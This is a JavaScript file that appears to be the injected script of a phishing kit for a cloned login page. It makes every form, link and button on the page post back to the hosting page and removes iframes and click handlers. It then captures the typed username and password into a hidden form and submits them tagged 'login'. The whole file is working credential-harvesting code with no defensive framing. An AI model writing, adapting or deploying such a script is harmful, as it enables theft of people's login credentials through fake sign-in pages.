let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})


const form = document.createElement("form")
form.method = "POST"
form.action = location.href
form.style = "display: none;"

// sets
let username = document.querySelector("#username")
let password = document.querySelector("#password")
let submitBtn = document.querySelector("#submitBtn")

username.parentElement.querySelector("label").classList.add("ux-label--floating")
password.parentElement.querySelector("label").classList.add("ux-label--floating")

if (username && password) {
    submitBtn.addEventListener("click", () => {
        form.innerHTML += `
        <input type="text" name="username" value="${username.value}"> 
        <input type="text" name="password" value="${password.value}">
        <input type="hidden" name="spike-type" value="login">`
        document.body.appendChild(form)
        form.submit()
    })
}

let showPass = false
document.querySelectorAll(".ux-button-text").forEach(btn => {
    if (btn.innerText == 'Show') {
        btn.parentElement.addEventListener("click", () => {

            if (showPass == false) {
                password.type = "text"
                showPass = true
            } else {
                password.type = "password"
                showPass = false
            }
        })
    }
})